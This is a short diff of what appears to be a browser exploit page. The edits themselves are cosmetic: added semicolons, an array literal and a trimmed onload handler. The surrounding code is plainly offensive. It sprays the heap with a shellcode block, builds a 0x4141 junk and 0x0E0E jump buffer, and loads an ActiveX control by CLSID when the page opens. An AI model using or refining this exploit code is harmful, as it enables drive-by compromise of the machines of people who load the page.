@@ -90,7 +90,7 @@ var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
 
  
 
- var memory = new Array();
+ var memory = [];
  for (i = 0; i < 400; i++){ memory[i] = block + shellcode1 }
  
   
@@ -108,10 +108,10 @@ var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
 
  function makeBuf(unicode) {
  
- var junk = ""
+ var junk = "";
  for (i = 0; i < 2000; i++) { junk = junk + unescape("%u4141") }
 
- var jmp = ""
+ var jmp = "";
  
   if (unicode == 1) {
   for (i = 0; i < 900; i++) { jmp = jmp + unescape("%u0E0E") }
@@ -126,7 +126,7 @@ var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
    
    </script>
   </head>
- <body onload="JavaScript: return Check();">
+ <body onload="return Check();">
  <object id="dwa7w" classid="clsid:E008A543-CEFB-4559-912F-C27C2B89F13B">
   Unable to create object
  </object>
